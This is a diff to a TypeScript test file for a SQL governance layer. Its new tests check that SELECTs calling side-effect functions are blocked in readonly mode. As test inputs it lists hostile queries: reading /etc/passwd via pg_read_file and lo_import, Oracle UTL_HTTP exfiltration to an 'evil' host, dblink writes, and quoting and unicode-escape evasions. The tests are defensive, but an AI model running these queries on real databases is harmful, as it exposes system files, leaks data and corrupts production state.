@@ -1,7 +1,7 @@
 import assert from "node:assert/strict";
 import { test } from "node:test";
 import { decideSqlRun } from "../warehouse/governance";
-import { classifySql } from "../sql/classify";
+import { classifySql, sideEffectFnCall } from "../sql/classify";
 import { dialectUsesBackslashEscapes } from "../sql/lex";
 import { buildCostPlan, buildRunPlan, buildTestPlan, capCsv, isPlanError, renderResultCard, sanitizeWarehouseOutput } from "../warehouse/sqlRunners";
 import { columnsInventorySql, mergeIndexes, parseInventoryCsv, parseSnapshot, serializeSnapshot, snapshotToIndex } from "../warehouse/schemaSnapshot";
@@ -83,6 +83,67 @@ test("dialectUsesBackslashEscapes: só backslash-dialects; desconhecido = false 
   assert.equal(dialectUsesBackslashEscapes("postgres"), false);
   assert.equal(dialectUsesBackslashEscapes("duckdb"), false);
   assert.equal(dialectUsesBackslashEscapes(undefined), false);
+});
+
+// Achado ADVERSARIAL do #218 (era o follow-up não-entregue do #208): um SELECT que chama FUNÇÃO com efeito
+// colateral MUTA estado apesar do verbo líder ser leitura → rodava "auto" em readonly. Denylist fecha os
+// vetores enumeráveis (dblink_exec = escrita arbitrária; setval/nextval = sequência; lo_*/pg_read_file = FS).
+test("governança: SELECT de função volátil é ESCRITA (bloqueia em readonly, confirma em readonly:false)", () => {
+  for (const sql of [
+    "SELECT nextval('accounts_id_seq')",
+    "SELECT setval('accounts_id_seq', 1, false)",
+    "SELECT dblink_exec('dbname=prod', 'UPDATE accounts SET balance=0')",
+    "SELECT lo_import('/etc/passwd')",
+    "SELECT pg_read_file('/etc/passwd')",
+    "SELECT accounts_seq.NEXTVAL FROM dual", // Oracle: pseudo-coluna
+    "SELECT id FROM accounts WHERE setval('s', id) > 0", // escondido no WHERE
+    "SELECT id, (SELECT setval('s', id)) FROM accounts", // escondido em subquery escalar
+    "SELECT UTL_HTTP.REQUEST('http://evil/exfil') FROM dual", // Oracle SSRF/exfil de rede
+    "SELECT UTL_INADDR.GET_HOST_ADDRESS('internal') FROM dual", // Oracle DNS exfil
+    // EVASÕES que a revisão adversarial pegou:
+    `SELECT "setval"('s', 1, false)`, // identificador quotado (Postgres: "setval" == setval)
+    `SELECT pg_catalog."setval"('s', 1)`, // qualificado + quotado
+    `SELECT "UTL_HTTP".REQUEST('http://evil') FROM dual`, // Oracle pacote quotado
+    "SELECT dblink_connect('c', 'host=evil dbname=x user=y')", // dblink async — conexão de saída (SSRF)
+    "SELECT dblink_send_query('c', 'UPDATE accounts SET balance=0')",
+    "SELECT pg_logical_emit_message(true, 'p', 'payload')", // escreve no WAL
+    "SELECT pg_drop_replication_slot('s')", // muta estado de replicação (DoS de retenção)
+    "SELECT DBMS_XMLGEN.GETXML('SELECT 1 FROM dual') FROM dual", // Oracle: executa SQL arbitrário
+    "SELECT pg_promote()",
+    String.raw`SELECT U&"\0073etval"('accounts_seq', 1)`, // Postgres unicode-escaped: \0073='s' → setval
+  ]) {
+    assert.equal(decideSqlRun(sql, PG).verdict, "blocked", `readonly deve bloquear: ${sql}`);
+    assert.equal(decideSqlRun(sql, { ...PG, readonly: false }).verdict, "confirm", `readonly:false confirma: ${sql}`);
+  }
+});
+
+test("governança: função PURA comum não é falso-positivo — SELECT analítico segue auto", () => {
+  for (const sql of [
+    "SELECT count(*), date_trunc('day', ts), coalesce(a, b) FROM t WHERE x > 0",
+    "SELECT currval('s') FROM t", // currval só LÊ (não avança) — leitura
+    "SELECT nextval FROM t", // COLUNA chamada nextval (sem parêntese) — não é a função
+    "SELECT * FROM nextval_audit", // TABELA homônima — não casa (sem `nextval(`)
+    String.raw`SELECT U&"caf\00e9" FROM t`, // identificador unicode legítimo (coluna "café") → decodifica p/ si, sem match
+    String.raw`SELECT * FROM U&"sch\00e9ma".tbl`, // schema unicode legítimo (não é chamada de função)
+  ]) {
+    assert.equal(decideSqlRun(sql, PG).verdict, "auto", `não deve bloquear: ${sql}`);
+  }
+});
+
+test("sideEffectFnCall: casa a chamada da função (não coluna/tabela homônima); pura → null", () => {
+  assert.equal(sideEffectFnCall("select dblink_exec('c','update t set a=1')"), "dblink_exec");
+  assert.equal(sideEffectFnCall("select pg_catalog.setval('s',1)"), "setval"); // qualificado
+  assert.equal(sideEffectFnCall("select accounts_seq.NEXTVAL from dual"), "nextval"); // Oracle
+  assert.equal(sideEffectFnCall("select nextval from t"), null); // coluna, sem `(`
+  assert.equal(sideEffectFnCall("select my_nextval(x)"), null); // função de nome próprio (não a built-in)
+  assert.equal(sideEffectFnCall("select count(*), date_trunc('day', ts) from t"), null); // puras
+  // EVASÃO por identificador quotado (achado adversarial): a normalização de aspas fecha
+  assert.equal(sideEffectFnCall(`select "setval"('s',1)`), "setval");
+  assert.equal(sideEffectFnCall(`select pg_catalog."setval"('s',1)`), "setval");
+  assert.equal(sideEffectFnCall(`select "UTL_HTTP".request('x') from dual`), "utl_http");
+  assert.equal(sideEffectFnCall("select dblink_connect('c','host=evil')"), "dblink_connect");
+  // uma coluna quotada homônima (sem `(`) segue null — não é a função
+  assert.equal(sideEffectFnCall(`select "setval" from t`), null);
 });
 
 // ---------- planos de CLI (caminho tradicional) ----------
@@ -266,7 +327,6 @@ test("piiScan: dicionário LGPD por nome de coluna + card; máscara de amostras 
 
 // ---- regressões da revisão adversarial (Ondas 3/4) ------------------------------------------------
 
-import { classifySql } from "../sql/classify";
 import { oracleTerminate } from "../warehouse/sqlRunners";
 
 test("REGRESSÃO crítica: DML dentro de CTE é ESCRITA (não roda como leitura)", () => {
